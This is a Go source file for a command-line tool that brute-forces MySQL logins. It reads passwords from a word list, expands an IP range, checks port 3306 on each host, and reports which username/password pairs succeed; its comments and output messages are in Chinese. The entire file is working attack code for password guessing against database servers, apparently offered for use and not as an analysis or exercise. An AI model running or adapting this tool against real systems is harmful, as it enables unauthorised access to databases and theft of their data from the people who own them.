package main

import (
	"bufio"
	"database/sql"
	"flag"
	"fmt"
	_"github.com/go-sql-driver/mysql"
	"github.com/gookit/color"
	"github.com/malfunkt/iprange"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)
func main(){
	var Username string
	var Password string
	var Ip string
	flag.StringVar(&Username,"Username","root","输入需要爆破的用户名")
	flag.StringVar(&Password,"Password","pass.txt","输入需要爆破的密码")
	flag.StringVar(&Ip,"u","192.168.1.1","输入需要爆破的ip")
	flag.Parse()
	file_open(Username,Password,Ip)

}

//打开文件方法
func file_open(Username string,Password string,IP string){
	start := time.Now()
	name := Password
	file_name ,err:=os.Open(name)
	if err!=nil{
		panic(err)
	}
	defer file_name.Close()
	read :=bufio.NewReader(file_name)
	for {
		line,err:=read.ReadString('\n')
		if err == io.EOF {
			break
		}
		content := strings.Replace(line, "\r\n", "", -1)
		var wg sync.WaitGroup
		for i := 0; i < 1; i++ {
			wg.Add(1)
			go func() {
				mysql_conn(Username,content,IP)
				wg.Done()
			}()
		}
		wg.Wait()
	}
	end := time.Now()
	consume := end.Sub(start).Seconds()
	fmt.Println("程序执行耗时(s)：", consume)
}

//mysql
func mysql_conn(Username string,content string,IP string){
	username := Username
	Password := content
	Port :=3306
	ips, err := Iplist(IP)
	if err != nil {
		return
	}

	for _, Ip := range ips {
		_,err = tcp_Connect(Ip.String(),Port)
		if err !=nil{
			color.Info.Println("端口没有开放，停止爆破mysql",Ip)
			continue
			//os.Exit(0)
		}else{
			dataSourceName := fmt.Sprintf("%v:%v@tcp(%v:%v)/%v?charset=utf8", username, Password, Ip, Port, "mysql")
			db, err := sql.Open("mysql", dataSourceName)
			db.SetMaxIdleConns(20)
			db.SetMaxOpenConns(20)
			db.SetConnMaxLifetime(time.Second * 500)
			if err != nil {
				//panic(err)
			}
			defer db.Close()
			err = db.Ping()
			if err != nil {
				failure:=fmt.Sprintf("ip:%v 用户：%v 密码:%v",Ip,username,Password)
				color.Danger.Println("爆破失败",failure)

			}else {
				success :=fmt.Sprintf("ip:%v 用户：%v 密码:%v",Ip,username,Password)
				color.Info.Println("爆破成功",success)
			}
		}
	}
	
}

//tcp连接扫描端口
func tcp_Connect(ip string, port int) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%v:%v", ip, port), 1*time.Second)
	defer func() {
		if conn != nil {
			_ = conn.Close()
		}
	}()
	return conn, err
}

//字符串中解析IPv4地址方法 例如：192.168.223.0/24
func Iplist(ip string)([]net.IP ,error){
	list,err:=iprange.ParseList(ip)
	if err !=nil{
		fmt.Println(err)
	}
	addressList :=list.Expand()
	return addressList,err
}
